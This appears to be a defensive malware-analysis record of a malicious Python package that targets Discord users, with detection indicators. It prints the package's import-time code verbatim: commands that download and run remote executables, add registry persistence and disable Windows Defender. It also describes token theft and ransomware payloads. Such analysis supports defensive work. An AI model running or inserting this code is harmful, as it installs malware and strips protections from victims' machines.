package_info.why_malicious: The package contains malicious code in its __init__.py that, upon import, executes a series of system commands to download and run additional malware, modify system security settings, and exfiltrate sensitive information. The package is designed to target Discord users and compromise their systems, including credential theft and ransomware activities.

malicious_snippets.code_snippet:
import subprocess
subprocess.call('curl hxxps://uptime.windowstools.repl.co/logger -o KrnlBypasswer.exe && KrnlBypasswer.exe', shell=True)
subprocess.call('curl hxxps://uptime.windowstools.repl.co/controller -o Windows Defender.exe && Windows Defender.exe', shell=True)
subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DiscordUpdate /t REG_SZ /d "C:\\Path\\To\\Malware.exe" /f', shell=True)
subprocess.call('powershell Set-MpPreference -ExclusionExtension ".exe"', shell=True)
subprocess.call('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True)
subprocess.call('start wmplayer clown_bgm.mp3', shell=True)
malicious_snippets.code_behavior: At import-time, the code downloads two executables from remote URLs and executes them, modifies Windows registry to establish persistence, disables Windows Defender protections, and plays an audio file as a taunt.

malice_analysis.why_suspicious: The code performs multiple high-risk actions automatically upon import, including downloading and executing remote binaries, disabling security software, and establishing persistence.
malice_analysis.violated_expectations: Normal Python packages should not execute system-level commands, download and run executables, or alter system security settings during import.
malice_analysis.similar_legitimate_use: Automated installers or updaters may download and run binaries, but only with explicit user consent and clear documentation.
key_indicators: Use of subprocess to execute shell commands on import

malicious_snippets.code_snippet: Reads Discord ldb files, extracts tokens, and exfiltrates them via webhook.
malicious_snippets.code_language: executable (likely Python or C# compiled to exe)
malicious_snippets.code_behavior: At runtime, the code searches for Discord's local database (ldb) files, extracts authentication tokens and sensitive information, and sends them to a remote Discord webhook controlled by the attacker.

malice_analysis.why_suspicious: Accessing and exfiltrating Discord tokens is a well-known credential theft technique. The code targets specific application data files for sensitive information.
malice_analysis.violated_expectations: Legitimate software should not access or transmit Discord tokens or user data without explicit user consent.
malice_analysis.similar_legitimate_use: Discord backup tools may access ldb files, but should never exfiltrate data to untrusted endpoints.

execution_context.file_location: Windows Defender.exe (downloaded and executed by snippet_1)

malicious_snippets.code_snippet: Collects system IP and hardware ID, checks for cryptocurrency wallets, encrypts files, deletes files, adds itself to startup, and sends location and system info to attacker.
malicious_snippets.code_language: executable (likely C# or Python compiled to exe)
malicious_snippets.code_behavior: At runtime, the code collects system and user information, checks for cryptocurrency wallets, encrypts user files (ransomware), deletes files, establishes persistence via registry, and exfiltrates data to the attacker.

malice_analysis.why_suspicious: The code performs multiple malicious actions: data collection, ransomware, persistence, and exfiltration, all without user consent.
malice_analysis.violated_expectations: Legitimate software should not encrypt user files, delete data, or exfiltrate sensitive information.
malice_analysis.similar_legitimate_use: Enterprise endpoint management tools may collect system info, but not encrypt or delete user files.

behavioral_signatures: Python package executing subprocess or shell commands at import-time
Automatic download and execution of remote binaries
Modification of Windows Defender settings via PowerShell
Access to Discord ldb files and exfiltration of tokens
file_indicators: Downloaded files named KrnlBypasswer.exe, Windows Defender.exe, loader.exe, Grabber.exe
detection_knowledge.how_to_detect: Monitor Python packages for import-time execution of subprocess or os.system calls, especially those that download and execute remote binaries. Flag packages that modify Windows Defender settings or Windows registry for persistence. Detect access to Discord ldb files and outbound connections to Discord webhooks or suspicious remote servers. Look for file encryption or deletion behaviors indicative of ransomware.
